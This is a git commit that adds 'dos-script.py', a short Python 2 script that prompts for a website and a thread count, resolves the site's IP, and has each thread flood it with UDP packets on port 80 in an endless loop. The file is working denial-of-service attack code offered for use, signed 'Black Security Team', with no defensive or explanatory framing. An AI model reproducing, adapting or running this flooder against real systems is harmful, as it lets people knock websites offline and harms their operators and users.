cf7c2f6fbadc92ba504009a28300b01a925a8fa9
Victor cyber <77151280+vectorcyber@users.noreply.github.com>
2021-01-09 21:04:46 +0330

    Add files via upload

---
+++ dos-script.py
@@ -0,0 +1,29 @@
+import time
+import socket
+import sys
+import thread
+
+site = raw_input("Enter your site url = ")
+thread_count = input("Enter your thread = ")
+
+ip = socket.gethostbyname(site)
+
+UDP_PORT = 80
+MESSAGE = "Black Security Team"
+print "UDP target IP:", ip
+print "UDP target port:", UDP_PORT
+time.sleep(3)
+
+def dos(i):
+  while True:  
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      sock.sendto(MESSAGE, (ip, UDP_PORT))
+      print "Packet Sent"
+    
+for i in xrange(thread_count):
+  try:
+   thread.start_new_thread( dos , ("Thread-"+str(i),) )
+  except KeyboardInterrupt:
+      sys.exit(0)
+while 1:
+  pass
